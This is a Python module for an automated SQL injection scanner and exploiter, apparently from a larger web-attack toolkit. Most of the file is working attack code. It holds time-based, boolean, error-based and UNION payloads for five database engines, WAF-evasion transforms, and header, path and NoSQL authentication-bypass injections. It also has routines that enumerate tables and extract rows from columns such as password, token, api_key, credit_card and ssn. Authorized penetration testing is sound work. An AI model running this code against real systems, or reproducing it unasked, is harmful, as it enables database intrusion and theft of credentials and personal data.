import re
import asyncio
from urllib.parse import quote, urljoin
from modules.base import BaseModule
from core.utils import extract_params, random_string
from core.http import inject_param


class SqliModule(BaseModule):
    name = "sqli"
    description = "SQL Injection Scanner with Auto Exploitation"
    exploitable = True
    
    error_patterns = [
        (r"SQL syntax.*MySQL", "MySQL"),
        (r"Warning.*mysql_", "MySQL"),
        (r"MySqlException", "MySQL"),
        (r"valid MySQL result", "MySQL"),
        (r"check the manual that corresponds to your (MySQL|MariaDB)", "MySQL"),
        (r"MySqlClient\.", "MySQL"),
        (r"com\.mysql\.jdbc", "MySQL"),
        (r"Pdo[./_\\\\]Mysql", "MySQL"),
        (r"PostgreSQL.*ERROR", "PostgreSQL"),
        (r"Warning.*\Wpg_", "PostgreSQL"),
        (r"valid PostgreSQL result", "PostgreSQL"),
        (r"Npgsql\.", "PostgreSQL"),
        (r"PG::SyntaxError:", "PostgreSQL"),
        (r"org\.postgresql\.util\.PSQLException", "PostgreSQL"),
        (r"ERROR:\s+syntax error at or near", "PostgreSQL"),
        (r"Driver.*SQL[\-\_\ ]*Server", "MSSQL"),
        (r"OLE DB.*SQL Server", "MSSQL"),
        (r"SQLServer JDBC Driver", "MSSQL"),
        (r"Microsoft SQL Native Client error", "MSSQL"),
        (r"\[SQL Server\]", "MSSQL"),
        (r"ODBC SQL Server Driver", "MSSQL"),
        (r"SQLSrv", "MSSQL"),
        (r"Unclosed quotation mark after the character string", "MSSQL"),
        (r"ORA-[0-9]{5}", "Oracle"),
        (r"Oracle error", "Oracle"),
        (r"Oracle.*Driver", "Oracle"),
        (r"Warning.*\Woci_", "Oracle"),
        (r"Warning.*\Wora_", "Oracle"),
        (r"oracle\.jdbc\.driver", "Oracle"),
        (r"quoted string not properly terminated", "Oracle"),
        (r"CLI Driver.*DB2", "DB2"),
        (r"DB2 SQL error", "DB2"),
        (r"SQLite.*error", "SQLite"),
        (r"sqlite3\.OperationalError", "SQLite"),
        (r"SQLite\.Exception", "SQLite"),
        (r"System\.Data\.SQLite\.SQLiteException", "SQLite"),
        (r"Warning.*sqlite_", "SQLite"),
        (r"Warning.*SQLite3::", "SQLite"),
        (r"\[SQLITE_ERROR\]", "SQLite"),
        (r"SQLSTATE\[", "Unknown"),
        (r"Unclosed quotation mark", "Unknown"),
        (r"syntax error at or near", "Unknown"),
        (r"Unterminated string literal", "Unknown"),
        (r"division by zero", "Unknown"),
        (r"Unknown column", "Unknown"),
        (r"Invalid column name", "Unknown"),
        (r"Query failed", "Unknown"),
    ]
    
    time_payloads = {
        "MySQL": [
            ("' AND SLEEP({time})-- ", 5),
            ("' OR SLEEP({time})-- ", 5),
            ("\" AND SLEEP({time})-- ", 5),
            ("') AND SLEEP({time})-- ", 5),
            ("' AND (SELECT * FROM (SELECT SLEEP({time}))a)-- ", 5),
            ("' AND BENCHMARK(10000000,SHA1('test'))-- ", 3),
            ("1' AND SLEEP({time})-- ", 5),
            ("1) AND SLEEP({time})-- ", 5),
        ],
        "MSSQL": [
            ("'; WAITFOR DELAY '00:00:0{time}'-- ", 5),
            ("' WAITFOR DELAY '00:00:0{time}'-- ", 5),
            ("'); WAITFOR DELAY '00:00:0{time}'-- ", 5),
            ("1; WAITFOR DELAY '00:00:0{time}'-- ", 5),
        ],
        "PostgreSQL": [
            ("' AND pg_sleep({time})-- ", 5),
            ("' OR pg_sleep({time})-- ", 5),
            ("'; SELECT pg_sleep({time})-- ", 5),
            ("' || pg_sleep({time})-- ", 5),
            ("1 AND pg_sleep({time})-- ", 5),
        ],
        "Oracle": [
            ("' AND DBMS_PIPE.RECEIVE_MESSAGE('a',{time})=1-- ", 5),
            ("' OR DBMS_PIPE.RECEIVE_MESSAGE('a',{time})=1-- ", 5),
            ("' AND 1=DBMS_LOCK.SLEEP({time})-- ", 5),
        ],
        "SQLite": [
            ("' AND 1=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))-- ", 3),
        ],
    }
    
    schema_queries = {
        "MySQL": {
            "version": "@@version",
            "current_db": "database()",
            "current_user": "user()",
            "tables": "SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT {offset},1",
            "columns": "SELECT column_name FROM information_schema.columns WHERE table_schema=database() AND table_name='{table}' LIMIT {offset},1",
            "data": "SELECT {column} FROM {table} LIMIT {offset},1",
            "concat": "CONCAT({args})",
            "concat_sep": "0x7c",
        },
        "PostgreSQL": {
            "version": "version()",
            "current_db": "current_database()",
            "current_user": "current_user",
            "tables": "SELECT table_name FROM information_schema.tables WHERE table_schema='public' LIMIT 1 OFFSET {offset}",
            "columns": "SELECT column_name FROM information_schema.columns WHERE table_name='{table}' LIMIT 1 OFFSET {offset}",
            "data": "SELECT {column} FROM {table} LIMIT 1 OFFSET {offset}",
            "concat": "CONCAT({args})",
            "concat_sep": "CHR(124)",
        },
        "MSSQL": {
            "version": "@@version",
            "current_db": "DB_NAME()",
            "current_user": "SYSTEM_USER",
            "tables": "SELECT TOP 1 name FROM sysobjects WHERE xtype='U' AND name NOT IN (SELECT TOP {offset} name FROM sysobjects WHERE xtype='U')",
            "columns": "SELECT TOP 1 name FROM syscolumns WHERE id=OBJECT_ID('{table}') AND name NOT IN (SELECT TOP {offset} name FROM syscolumns WHERE id=OBJECT_ID('{table}'))",
            "data": "SELECT TOP 1 {column} FROM {table} WHERE {column} NOT IN (SELECT TOP {offset} {column} FROM {table})",
            "concat": "CONCAT({args})",
            "concat_sep": "CHAR(124)",
        },
        "SQLite": {
            "version": "sqlite_version()",
            "current_db": "'main'",
            "current_user": "'sqlite'",
            "tables": "SELECT name FROM sqlite_master WHERE type='table' LIMIT 1 OFFSET {offset}",
            "columns": "SELECT name FROM pragma_table_info('{table}') LIMIT 1 OFFSET {offset}",
            "data": "SELECT {column} FROM {table} LIMIT 1 OFFSET {offset}",
            "concat": "({args})",
            "concat_sep": "'|'",
        },
    }
    
    waf_bypasses = [
        lambda p: p,
        lambda p: p.replace(" ", "/**/"),
        lambda p: p.replace(" ", "%09"),
        lambda p: p.replace(" ", "%0a"),
        lambda p: p.replace("'", "%27"),
        lambda p: p.replace(" ", "%00"),
        lambda p: p.replace("SELECT", "SeLeCt").replace("UNION", "UnIoN").replace("AND", "AnD"),
        lambda p: p.replace("SELECT", "/*!50000SELECT*/").replace("UNION", "/*!50000UNION*/"),
    ]
    
    interesting_tables = ["users", "admin", "accounts", "members", "credentials", "passwords", "login", "customers"]
    interesting_columns = ["password", "passwd", "pass", "pwd", "secret", "hash", "token", "api_key", "credit_card", "ssn", "email", "username", "user", "admin"]
    
    async def scan(self, target):
        self.findings = []
        self.detected_db = None
        self.injectable_param = None
        self.injectable_payload = None
        self.union_columns = 0
        self.extracted_data = {}
        
        params = extract_params(target)
        
        if not params:
            await self._test_path_sqli(target)
            return self.findings
        
        self.log(f"[SQLi] Testing {len(params)} parameters...")
        
        vuln_found = await self._detect_sqli(target, params)
        
        if vuln_found:
            self.log(f"[SQLi] Vulnerability confirmed! Starting exploitation...")
            await self._exploit_sqli(target)
        
        await self._test_header_sqli(target)
        await self._test_nosql(target)
        
        return self.findings
    
    async def _detect_sqli(self, target, params):
        for param in params:
            if await self._test_error_based(target, param):
                return True
            if await self._test_boolean_based(target, param):
                return True
            if await self._test_time_based(target, param):
                return True
        return False
    
    async def _test_error_based(self, target, param):
        payloads = ["'", "\"", "' OR '1'='1", "1'", "1\"", "')", "'))",
                    "' AND 1=CONVERT(int,(SELECT @@version))-- ",
                    "' AND EXTRACTVALUE(1,CONCAT(0x7e,@@version))-- "]
        
        for payload in payloads:
            for bypass in self.waf_bypasses[:3]:
                test_payload = bypass(payload)
                resp = await self.test_param(target, param, test_payload)
                
                if resp.get("status"):
                    for pattern, db_type in self.error_patterns:
                        if re.search(pattern, resp["text"], re.IGNORECASE):
                            self.detected_db = db_type
                            self.injectable_param = param
                            self.injectable_payload = test_payload
                            self.record_success(test_payload, target)
                            
                            self.add_finding(
                                "CRITICAL",
                                f"Error-based SQL Injection ({db_type})",
                                url=target,
                                parameter=param,
                                evidence=f"Database: {db_type}, Error triggered with: {test_payload[:50]}"
                            )
                            return True
        return False
    
    async def _test_boolean_based(self, target, param):
        test_cases = [
            ("' OR '1'='1'-- ", "' AND '1'='2'-- "),
            ("' OR 1=1-- ", "' AND 1=2-- "),
            ("1 OR 1=1", "1 AND 1=2"),
            ("\" OR \"1\"=\"1", "\" AND \"1\"=\"2"),
            ("1) OR (1=1", "1) AND (1=2"),
        ]
        
        baseline = await self.baseline_request(target)
        if not baseline.get("status"):
            return False
        
        for true_payload, false_payload in test_cases:
            true_resp = await self.test_param(target, param, true_payload)
            false_resp = await self.test_param(target, param, false_payload)
            
            if not (true_resp.get("status") and false_resp.get("status")):
                continue
            
            true_len = len(true_resp.get("text", ""))
            false_len = len(false_resp.get("text", ""))
            len_diff = abs(true_len - false_len)
            
            if len_diff > 50:
                self.injectable_param = param
                self.injectable_payload = true_payload
                
                self.add_finding(
                    "HIGH",
                    "Boolean-based Blind SQL Injection",
                    url=target,
                    parameter=param,
                    evidence=f"Response length diff: {len_diff} bytes (true={true_len}, false={false_len})"
                )
                return True
            
            if true_resp["status"] != false_resp["status"]:
                self.injectable_param = param
                self.injectable_payload = true_payload
                
                self.add_finding(
                    "HIGH",
                    "Boolean-based Blind SQL Injection (status)",
                    url=target,
                    parameter=param,
                    evidence=f"Status codes: true={true_resp['status']}, false={false_resp['status']}"
                )
                return True
        
        return False
    
    async def _test_time_based(self, target, param):
        baseline = await self.http.timed_get(target)
        if not baseline.get("status"):
            return False
        
        baseline_time = baseline.get("elapsed", 0)
        
        db_types = ["MySQL", "MSSQL", "PostgreSQL", "SQLite"]
        if self.detected_db:
            db_types = [self.detected_db] + [d for d in db_types if d != self.detected_db]
        
        for db_type in db_types:
            payloads = self.time_payloads.get(db_type, [])
            
            for payload_template, delay in payloads[:2]:
                payload = payload_template.format(time=delay)
                test_url = inject_param(target, param, payload)
                
                resp = await self.http.timed_get(test_url)
                
                if resp.get("status"):
                    elapsed = resp.get("elapsed", 0)
                    
                    if elapsed >= baseline_time + (delay - 1):
                        self.detected_db = db_type
                        self.injectable_param = param
                        self.injectable_payload = payload
                        
                        self.add_finding(
                            "CRITICAL",
                            f"Time-based Blind SQL Injection ({db_type})",
                            url=target,
                            parameter=param,
                            evidence=f"Response delayed by {elapsed:.2f}s (baseline: {baseline_time:.2f}s)"
                        )
                        return True
        
        return False
    
    async def _exploit_sqli(self, target):
        if not self.injectable_param:
            return
        
        if await self._exploit_union(target):
            return
        
        if self.detected_db and await self._exploit_error_based(target):
            return
        
        await self._exploit_blind(target)
    
    async def _exploit_union(self, target):
        self.log("[SQLi] Enumerating columns for UNION...")
        
        marker = f"LNTRN{random_string(8)}SQLI"
        
        for num_cols in range(1, 20):
            nulls = ",".join(["NULL"] * num_cols)
            marker_nulls = ",".join([f"'{marker}'" if i == 0 else "NULL" for i in range(num_cols)])
            
            payloads = [
                (f"' UNION SELECT {nulls}-- ", f"' UNION SELECT {marker_nulls}-- "),
                (f"' UNION ALL SELECT {nulls}-- ", f"' UNION ALL SELECT {marker_nulls}-- "),
                (f"\" UNION SELECT {nulls}-- ", f"\" UNION SELECT {marker_nulls}-- "),
                (f"') UNION SELECT {nulls}-- ", f"') UNION SELECT {marker_nulls}-- "),
                (f"1 UNION SELECT {nulls}-- ", f"1 UNION SELECT {marker_nulls}-- "),
                (f"-1 UNION SELECT {nulls}-- ", f"-1 UNION SELECT {marker_nulls}-- "),
                (f"' UNION SELECT {nulls}#", f"' UNION SELECT {marker_nulls}#"),
            ]
            
            for payload, marker_payload in payloads:
                resp = await self.test_param(target, self.injectable_param, payload)
                
                if resp.get("status") == 200:
                    has_error = any(re.search(p[0], resp.get("text", ""), re.IGNORECASE) for p in self.error_patterns)
                    
                    if not has_error:
                        marker_resp = await self.test_param(target, self.injectable_param, marker_payload)
                        if marker in marker_resp.get("text", ""):
                            self.union_columns = num_cols
                            self.log(f"[SQLi] Found {num_cols} columns (marker confirmed)!")
                            await self._union_extract_data(target, payload, num_cols)
                            return True
                        
                        self.union_columns = num_cols
                        self.log(f"[SQLi] Found {num_cols} columns!")
                        await self._union_extract_data(target, payload, num_cols)
                        return True
        
        return False
    
    async def _union_extract_data(self, target, base_payload, num_cols):
        db_type = self.detected_db or "MySQL"
        schema = self.schema_queries.get(db_type, self.schema_queries["MySQL"])
        
        extracted = {"database": db_type, "version": None, "current_db": None, "tables": [], "data": {}}
        
        def make_extraction_payload(query):
            cols = ["NULL"] * num_cols
            cols[0] = f"({query})"
            return base_payload.replace(",".join(["NULL"] * num_cols), ",".join(cols))
        
        try:
            payload = make_extraction_payload(schema["version"])
            resp = await self.test_param(target, self.injectable_param, payload)
            if resp.get("status") == 200:
                version_match = re.search(r'(\d+\.\d+\.\d+[-\w]*)', resp.get("text", ""))
                if version_match:
                    extracted["version"] = version_match.group(1)
                    self.log(f"[SQLi] Version: {extracted['version']}")
        except:
            pass
        
        try:
            payload = make_extraction_payload(schema["current_db"])
            resp = await self.test_param(target, self.injectable_param, payload)
            if resp.get("status") == 200:
                text = resp.get("text", "")
                baseline = await self.baseline_request(target)
                baseline_text = baseline.get("text", "")
                new_words = set(re.findall(r'\b\w+\b', text)) - set(re.findall(r'\b\w+\b', baseline_text))
                if new_words:
                    db_names = [w for w in new_words if len(w) > 2 and w.lower() not in ['null', 'none', 'true', 'false']]
                    if db_names:
                        extracted["current_db"] = db_names[0]
                        self.log(f"[SQLi] Database: {extracted['current_db']}")
        except:
            pass
        
        self.log("[SQLi] Enumerating tables...")
        for i in range(20):
            try:
                query = schema["tables"].format(offset=i)
                payload = make_extraction_payload(query)
                resp = await self.test_param(target, self.injectable_param, payload)
                
                if resp.get("status") == 200:
                    text = resp.get("text", "")
                    for interesting in self.interesting_tables:
                        if interesting.lower() in text.lower():
                            if interesting not in extracted["tables"]:
                                extracted["tables"].append(interesting)
                                self.log(f"[SQLi] Found table: {interesting}")
                    
                    table_matches = re.findall(r'\b([a-z_][a-z0-9_]*)\b', text.lower())
                    for t in table_matches:
                        if t not in extracted["tables"] and len(t) > 2 and t not in ['null', 'the', 'and', 'for']:
                            if any(kw in t for kw in ['user', 'admin', 'account', 'member', 'customer', 'order', 'product']):
                                extracted["tables"].append(t)
                else:
                    break
            except:
                break
        
        async def check_column(table, col):
            try:
                query = f"SELECT {col} FROM {table} LIMIT 1"
                payload = make_extraction_payload(query)
                resp = await self.test_param(target, self.injectable_param, payload)
                if resp.get("status") == 200 and "error" not in resp.get("text", "").lower():
                    return col
            except:
                pass
            return None
        
        for table in extracted["tables"][:5]:
            self.log(f"[SQLi] Extracting from {table}...")
            extracted["data"][table] = []
            
            column_checks = [check_column(table, col) for col in self.interesting_columns]
            results = await asyncio.gather(*column_checks, return_exceptions=True)
            columns = [c for c in results if c and not isinstance(c, Exception)]
            
            if columns:
                for i in range(5):
                    try:
                        col_str = ",".join(columns[:3])
                        query = f"SELECT CONCAT({col_str}) FROM {table} LIMIT 1 OFFSET {i}"
                        payload = make_extraction_payload(query)
                        resp = await self.test_param(target, self.injectable_param, payload)
                        if resp.get("status") == 200:
                            text = resp.get("text", "")
                            data_match = re.search(r'([a-zA-Z0-9@._-]+:[a-zA-Z0-9@._-]+)', text)
                            if data_match:
                                extracted["data"][table].append(data_match.group(1))
                    except:
                        break
        
        if extracted["version"] or extracted["tables"] or extracted["data"]:
            evidence_parts = []
            if extracted["version"]:
                evidence_parts.append(f"Version: {extracted['version']}")
            if extracted["current_db"]:
                evidence_parts.append(f"Database: {extracted['current_db']}")
            if extracted["tables"]:
                evidence_parts.append(f"Tables: {', '.join(extracted['tables'][:5])}")
            
            for table, rows in extracted["data"].items():
                if rows:
                    evidence_parts.append(f"Data from {table}: {rows[0][:50]}...")
            
            self.add_finding(
                "CRITICAL",
                "SQL Injection - Data Extracted!",
                url=target,
                parameter=self.injectable_param,
                evidence=" | ".join(evidence_parts)
            )
            
            self.extracted_data = extracted
            return True
        
        return False
    
    async def _exploit_error_based(self, target):
        if self.detected_db not in ["MySQL", "MSSQL", "Oracle"]:
            return False
        
        payloads = []
        
        if self.detected_db == "MySQL":
            payloads = [
                "' AND EXTRACTVALUE(1,CONCAT(0x7e,({query}),0x7e))-- ",
                "' AND UPDATEXML(1,CONCAT(0x7e,({query}),0x7e),1)-- ",
                "' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(({query}),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- ",
            ]
        elif self.detected_db == "MSSQL":
            payloads = [
                "' AND 1=CONVERT(int,({query}))-- ",
                "' AND 1=CAST(({query}) AS int)-- ",
            ]
        
        for payload_template in payloads:
            query = self.schema_queries.get(self.detected_db, {}).get("version", "@@version")
            payload = payload_template.format(query=query)
            
            resp = await self.test_param(target, self.injectable_param, payload)
            if resp.get("status"):
                text = resp.get("text", "")
                version_match = re.search(r'~([^~]+)~|XPATH[^:]*: \'([^\']+)\'', text)
                if version_match:
                    version = version_match.group(1) or version_match.group(2)
                    self.add_finding(
                        "CRITICAL",
                        f"Error-based SQLi - Data Extracted ({self.detected_db})",
                        url=target,
                        parameter=self.injectable_param,
                        evidence=f"Version: {version}"
                    )
                    return True
        
        return False
    
    async def _exploit_blind(self, target):
        self.log("[SQLi] Starting blind extraction (slow)...")
        
        version = ""
        
        for pos in range(1, 30):
            found = False
            
            for char_code in range(32, 127):
                if self.detected_db == "MySQL":
                    condition = f"ASCII(SUBSTRING(@@version,{pos},1))={char_code}"
                elif self.detected_db == "MSSQL":
                    condition = f"ASCII(SUBSTRING(@@version,{pos},1))={char_code}"
                elif self.detected_db == "PostgreSQL":
                    condition = f"ASCII(SUBSTRING(version(),{pos},1))={char_code}"
                else:
                    condition = f"ASCII(SUBSTR(sqlite_version(),{pos},1))={char_code}"
                
                payload = f"' AND {condition}-- "
                resp = await self.test_param(target, self.injectable_param, payload)
                
                if self._blind_check_true(resp):
                    version += chr(char_code)
                    found = True
                    break
            
            if not found:
                break
            
            if len(version) >= 10:
                break
        
        if version:
            self.add_finding(
                "CRITICAL",
                f"Blind SQLi - Version Extracted ({self.detected_db})",
                url=target,
                parameter=self.injectable_param,
                evidence=f"Version (partial): {version}"
            )
            return True
        
        return False
    
    def _blind_check_true(self, resp):
        if not resp.get("status"):
            return False
        text = resp.get("text", "")
        return len(text) > 500
    
    async def _test_header_sqli(self, target):
        headers_to_test = ["User-Agent", "Referer", "X-Forwarded-For", "Cookie", "X-Custom-Header"]
        
        for header in headers_to_test:
            payloads = ["'", "' OR '1'='1", "' AND SLEEP(2)-- "]
            
            for payload in payloads:
                resp = await self.http.get(target, headers={header: payload})
                
                if resp.get("status"):
                    for pattern, db_type in self.error_patterns:
                        if re.search(pattern, resp.get("text", ""), re.IGNORECASE):
                            self.add_finding(
                                "CRITICAL",
                                f"SQL Injection in {header} header ({db_type})",
                                url=target,
                                parameter=header,
                                evidence=f"Header injection with: {payload}"
                            )
                            return
    
    async def _test_nosql(self, target):
        nosql_payloads = [
            ('{"$gt": ""}', "json"),
            ('{"$ne": null}', "json"),
            ('{"$ne": ""}', "json"),
            ('{"$where": "1==1"}', "json"),
            ('{"$regex": ".*"}', "json"),
            ("true, $where: '1 == 1'", "form"),
            ("'; return true; var foo='", "form"),
        ]
        
        for payload, content_type in nosql_payloads:
            try:
                if content_type == "json":
                    resp = await self.http.post(target, json={"username": payload, "password": payload}, headers={"Content-Type": "application/json"})
                else:
                    resp = await self.http.post(target, data={"username": payload, "password": payload})
                
                if resp.get("status") == 200:
                    text = resp.get("text", "").lower()
                    if any(x in text for x in ["welcome", "dashboard", "logged in", "success", "token"]):
                        self.add_finding(
                            "CRITICAL",
                            "NoSQL Injection - Authentication Bypass",
                            url=target,
                            evidence=f"Payload: {payload[:50]}"
                        )
                        return
            except:
                pass
    
    async def _test_path_sqli(self, target):
        payloads = ["'", "\"", "' OR '1'='1", "1'", "1;--"]
        
        for payload in payloads:
            test_url = urljoin(target, quote(payload))
            
            try:
                resp = await self.http.get(test_url)
                
                if resp.get("status"):
                    for pattern, db_type in self.error_patterns:
                        if re.search(pattern, resp.get("text", ""), re.IGNORECASE):
                            self.add_finding(
                                "HIGH",
                                f"Path-based SQL Injection ({db_type})",
                                url=target,
                                evidence=f"Triggered with path: {payload}"
                            )
                            return
            except:
                pass
